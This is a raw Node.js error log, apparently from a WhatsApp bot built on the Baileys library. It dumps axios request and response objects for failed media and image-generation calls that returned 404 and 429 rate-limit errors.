      'User-Agent: axios/1.7.2\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: a.uguu.se\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 1,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/cOHUppFf.mp3',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'a.uguu.se',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'a.uguu.se',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'a.uguu.se',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 4958,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 557774,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 4960,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 404,
    statusText: 'Not Found',
    headers: Object [AxiosHeaders] {
      server: 'nginx',
      date: 'Sat, 27 Jul 2024 07:17:46 GMT',
      'content-type': 'text/html',
      'content-length': '146',
      connection: 'keep-alive',
      'strict-transport-security': 'max-age=31536000; includeSubDomains'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://a.uguu.se/cOHUppFf.mp3',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: a.uguu.se\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/cOHUppFf.mp3',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'a.uguu.se',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[28/07/24 19:46:33] - AxiosError: Request failed with status code 429
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:537:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33)
    at async Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/ai/loraai.js:16:1) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://ai.xterm.codes/api/text2img/instant-lora?id=1&prompt=a%20woman%20with%20long%20hair%20and%20a%20shirt%2C%20blue%20eyes%2C%20hair%20ornament%2C%20dress%2C%20closed%20mouth%2C%20upper%20body%2C%20purple%20hair%2C%20flower%2C%20hand%20up%2C%20hair%20flower%2C%20white%20dress%2C%20clothing%20cutout%2C%20cleavage%20cutout%2C%20hand%20in%20own%20hair&key=Bell409',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /api/text2img/instant-lora?id=1&prompt=a%20woman%20with%20long%20hair%20and%20a%20shirt%2C%20blue%20eyes%2C%20hair%20ornament%2C%20dress%2C%20closed%20mouth%2C%20upper%20body%2C%20purple%20hair%2C%20flower%2C%20hand%20up%2C%20hair%20flower%2C%20white%20dress%2C%20clothing%20cutout%2C%20cleavage%20cutout%2C%20hand%20in%20own%20hair&key=Bell409 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.2\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: ai.xterm.codes\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 1,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/api/text2img/instant-lora?id=1&prompt=a%20woman%20with%20long%20hair%20and%20a%20shirt%2C%20blue%20eyes%2C%20hair%20ornament%2C%20dress%2C%20closed%20mouth%2C%20upper%20body%2C%20purple%20hair%2C%20flower%2C%20hand%20up%2C%20hair%20flower%2C%20white%20dress%2C%20clothing%20cutout%2C%20cleavage%20cutout%2C%20hand%20in%20own%20hair&key=Bell409',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 429,
      statusMessage: 'Too Many Requests',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://ai.xterm.codes/api/text2img/instant-lora?id=1&prompt=a%20woman%20with%20long%20hair%20and%20a%20shirt%2C%20blue%20eyes%2C%20hair%20ornament%2C%20dress%2C%20closed%20mouth%2C%20upper%20body%2C%20purple%20hair%2C%20flower%2C%20hand%20up%2C%20hair%20flower%2C%20white%20dress%2C%20clothing%20cutout%2C%20cleavage%20cutout%2C%20hand%20in%20own%20hair&key=Bell409',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 36,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'ai.xterm.codes',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://ai.xterm.codes/api/text2img/instant-lora?id=1&prompt=a%20woman%20with%20long%20hair%20and%20a%20shirt%2C%20blue%20eyes%2C%20hair%20ornament%2C%20dress%2C%20closed%20mouth%2C%20upper%20body%2C%20purple%20hair%2C%20flower%2C%20hand%20up%2C%20hair%20flower%2C%20white%20dress%2C%20clothing%20cutout%2C%20cleavage%20cutout%2C%20hand%20in%20own%20hair&key=Bell409',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'ai.xterm.codes',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'ai.xterm.codes',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      autoSelectFamilyAttemptedAddresses: [Array],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 619048,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 9117454,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 619050,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 429,
    statusText: 'Too Many Requests',
    headers: Object [AxiosHeaders] {
      date: 'Sun, 28 Jul 2024 12:46:33 GMT',
      'content-type': 'application/json; charset=utf-8',
      'content-length': '87',
      connection: 'keep-alive',
      'report-to': '{"group":"heroku-nel","max_age":3600,"endpoints":[{"url":"https://nel.heroku.com/reports?ts=1722170793&sid=e11707d5-02a7-43ef-b45e-2cf4d2036f7d&s=iMllDUrcx0ImGXb9UQn%2Fr0xKGYLRZLm7kG6eJFGiZ%2Fo%3D"}]}',
      'reporting-endpoints': 'heroku-nel=https://nel.heroku.com/reports?ts=1722170793&sid=e11707d5-02a7-43ef-b45e-2cf4d2036f7d&s=iMllDUrcx0ImGXb9UQn%2Fr0xKGYLRZLm7kG6eJFGiZ%2Fo%3D',
      nel: '{"report_to":"heroku-nel","max_age":3600,"success_fraction":0.005,"failure_fraction":0.05,"response_headers":["Via"]}',
      'x-powered-by': 'Express',
      'x-ratelimit-limit': '850',
      'x-ratelimit-remaining': '0',
      'x-ratelimit-reset': '1722172533',
      'retry-after': '1740',
      etag: 'W/"57-dfo2Gd1cuRof1M3/it4rRLfrxOY"',
      via: '1.1 vegur',
      'cf-cache-status': 'DYNAMIC',
      server: 'cloudflare',
      'cf-ray': '8aa4f8fe0d0b40fa-SIN',
      'alt-svc': 'h3=":443"; ma=86400'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://ai.xterm.codes/api/text2img/instant-lora?id=1&prompt=a%20woman%20with%20long%20hair%20and%20a%20shirt%2C%20blue%20eyes%2C%20hair%20ornament%2C%20dress%2C%20closed%20mouth%2C%20upper%20body%2C%20purple%20hair%2C%20flower%2C%20hand%20up%2C%20hair%20flower%2C%20white%20dress%2C%20clothing%20cutout%2C%20cleavage%20cutout%2C%20hand%20in%20own%20hair&key=Bell409',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /api/text2img/instant-lora?id=1&prompt=a%20woman%20with%20long%20hair%20and%20a%20shirt%2C%20blue%20eyes%2C%20hair%20ornament%2C%20dress%2C%20closed%20mouth%2C%20upper%20body%2C%20purple%20hair%2C%20flower%2C%20hand%20up%2C%20hair%20flower%2C%20white%20dress%2C%20clothing%20cutout%2C%20cleavage%20cutout%2C%20hand%20in%20own%20hair&key=Bell409 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: ai.xterm.codes\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/api/text2img/instant-lora?id=1&prompt=a%20woman%20with%20long%20hair%20and%20a%20shirt%2C%20blue%20eyes%2C%20hair%20ornament%2C%20dress%2C%20closed%20mouth%2C%20upper%20body%2C%20purple%20hair%2C%20flower%2C%20hand%20up%2C%20hair%20flower%2C%20white%20dress%2C%20clothing%20cutout%2C%20cleavage%20cutout%2C%20hand%20in%20own%20hair&key=Bell409',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'ai.xterm.codes',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 429,
      statusMessage: 'Too Many Requests',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://ai.xterm.codes/api/text2img/instant-lora?id=1&prompt=a%20woman%20with%20long%20hair%20and%20a%20shirt%2C%20blue%20eyes%2C%20hair%20ornament%2C%20dress%2C%20closed%20mouth%2C%20upper%20body%2C%20purple%20hair%2C%20flower%2C%20hand%20up%2C%20hair%20flower%2C%20white%20dress%2C%20clothing%20cutout%2C%20cleavage%20cutout%2C%20hand%20in%20own%20hair&key=Bell409',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 36,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[28/07/24 19:47:19] - AxiosError: Request failed with status code 429
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:537:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33)
    at async Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/ai/loraai.js:16:1) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://ai.xterm.codes/api/text2img/instant-lora?id=7&prompt=a%20girl%2C%20aowkowk&key=Bell409',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /api/text2img/instant-lora?id=7&prompt=a%20girl%2C%20aowkowk&key=Bell409 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.2\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: ai.xterm.codes\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
